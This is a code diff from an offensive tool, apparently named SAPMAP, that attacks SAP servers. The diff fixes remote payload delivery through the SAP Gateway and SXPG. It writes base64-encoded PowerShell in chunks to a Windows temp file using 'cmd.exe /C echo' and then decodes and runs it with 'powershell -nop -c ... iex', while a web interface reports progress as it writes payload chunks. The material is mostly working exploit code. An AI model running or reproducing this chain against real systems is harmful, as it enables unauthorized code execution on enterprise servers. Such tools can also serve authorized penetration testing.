@@ -379,8 +379,14 @@ def _win_multistep_payload(ps_script: str, display: str) -> dict:
     via multiple 'cmd.exe /C echo ... >> file' calls, then run
     PowerShell to decode and execute from that file.
 
+    GW path — each step dict has three keys:
+      "command"     → EXTPROG (≤128 bytes, the executable only: "cmd.exe")
+      "params"      → PARAMS  (≤255 bytes, arguments: "/C echo ...")
+      "long_params" → "" to prevent old-kernel PARAMS+LONG_PARAMS concatenation
+                      (kernel 700/742 appends LONG_PARAMS to PARAMS if non-empty)
+
     Returns a dict with "steps" (list of command/params dicts) and
-    a final "command"/"params" that is the execute step.
+    a final "command"/"params"/"long_params" that is the execute step.
     """
     import base64
     tmp = r"C:\Windows\Temp\s"
@@ -391,21 +397,30 @@ def _win_multistep_payload(ps_script: str, display: str) -> dict:
     chunk_size = 80
     gw_chunks = [enc_u16[i:i+chunk_size]
                  for i in range(0, len(enc_u16), chunk_size)]
+    # Split every step into EXTPROG ("command") + PARAMS ("params").
+    # Previously the full "cmd.exe /C echo ..." was put in "command" (EXTPROG),
+    # which caused SAPXPG to call CreateProcess with the whole string as the
+    # executable path → ERROR_INVALID_HANDLE (6) / WaitForSingleObject failure.
+    # long_params="" prevents old kernels from appending LONG_PARAMS to PARAMS.
     steps = [
         # Clean up old files first
-        {"command": f"cmd.exe /C del /q {tmp} {tmp}.ps1 2>nul",
-         "params": ""},
+        {"command": "cmd.exe",
+         "params": f"/C del /q {tmp} {tmp}.ps1 2>nul",
+         "long_params": ""},
     ]
     for idx, chunk in enumerate(gw_chunks):
         redir = ">" if idx == 0 else ">>"
         steps.append({
-            "command": f"cmd.exe /C echo {chunk}{redir}{tmp}",
-            "params": "",
+            "command": "cmd.exe",
+            "params": f"/C echo {chunk}{redir}{tmp}",
+            "long_params": "",
         })
-    run_cmd = (f"powershell -nop -c \"$b=(gc '{tmp}')-join'';"
-               f"iex([Text.Encoding]::Unicode.GetString("
-               f"[Convert]::FromBase64String($b)))\"")
-    assert len(run_cmd) <= 128, f"Execute cmd too long: {len(run_cmd)}"
+    run_cmd_prog   = "powershell"
+    run_cmd_params = (f"-nop -c \"$b=(gc '{tmp}')-join'';"
+                      f"iex([Text.Encoding]::Unicode.GetString("
+                      f"[Convert]::FromBase64String($b)))\"")
+    assert len(run_cmd_prog)   <= 128, f"Execute EXTPROG too long: {run_cmd_prog!r}"
+    assert len(run_cmd_params) <= 255, f"Execute PARAMS too long: {len(run_cmd_params)}"
 
     # SXPG path: write ASCII Base64 chunks, decode+exec via
     # PowerShell -EncodedCommand (which encodes the DECODE script).
@@ -441,8 +456,9 @@ def _win_multistep_payload(ps_script: str, display: str) -> dict:
         })
     return {
         "steps": steps,
-        "command": run_cmd,
-        "params": "",
+        "command": run_cmd_prog,
+        "params": run_cmd_params,
+        "long_params": "",          # prevent PARAMS+LONG_PARAMS concat on old kernels
         "sxpg_steps": sxpg_steps,
         "sxpg_command": "powershell.exe",
         "sxpg_params": sxpg_params,
@@ -1558,7 +1574,8 @@ def create_app(api: SAPMAPApi) -> Bottle:
                         _shell_session.progress_msg = msg
 
             if method == "gateway":
-                # GW: full command line in EXTPROG
+                # GW: EXTPROG = "command", PARAMS = "params", LONG_PARAMS = "long_params"
+                # long_params="" prevents old-kernel PARAMS+LONG_PARAMS concatenation.
                 pre_steps = payload.get("steps", [])
                 if pre_steps:
                     total = len(pre_steps)
@@ -1569,10 +1586,12 @@ def create_app(api: SAPMAPApi) -> Bottle:
                         _set_progress(
                             f"Writing payload chunk {idx+1}/{total}...")
                         sapmap_exploit.execute_gw_command(
-                            node, step["command"], step["params"])
+                            node, step["command"], step["params"],
+                            long_params=step.get("long_params"))
                 _set_progress("Executing payload...")
                 result = sapmap_exploit.execute_gw_command(
-                    node, payload["command"], payload["params"])
+                    node, payload["command"], payload["params"],
+                    long_params=payload.get("long_params"))
             else:
                 # SXPG: split EXTPROG + PARAMS
                 creds = node.best_credentials()
